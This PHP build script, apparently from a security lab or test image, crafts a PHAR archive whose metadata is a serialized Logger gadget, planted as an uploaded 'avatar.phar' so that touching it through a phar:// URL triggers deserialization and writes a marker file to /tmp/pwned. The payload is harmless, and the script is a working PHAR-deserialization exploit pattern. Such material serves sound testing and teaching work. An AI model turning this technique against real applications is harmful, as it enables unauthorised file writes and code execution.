<?php
/**
 * Build a crafted PHAR archive whose metadata is a serialized Logger
 * gadget. The PHAR-stream wrapper unserializes the metadata when any
 * filesystem function touches a phar:// URL pointing at this file.
 *
 * Runs once at image build time. The output ends up at
 *   /var/www/html/uploads/avatar.phar
 * so the web request handler can reach it via phar://.
 */

require_once '/var/www/src/Logger.php';

@mkdir('/var/www/html/uploads', 0755, true);

$pharPath = '/var/www/html/uploads/avatar.phar';
@unlink($pharPath);

$phar = new Phar($pharPath);
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>\n");

$gadget = new Logger();
$gadget->logFile = '/tmp/pwned';
$gadget->payload = "phar-deser-fired\n";

$phar->setMetadata($gadget);
$phar->addFromString('dummy.txt', "you are not meant to read this\n");
$phar->stopBuffering();

// Sanity print so the build log shows the file was written.
echo "wrote {$pharPath} (" . filesize($pharPath) . " bytes)\n";
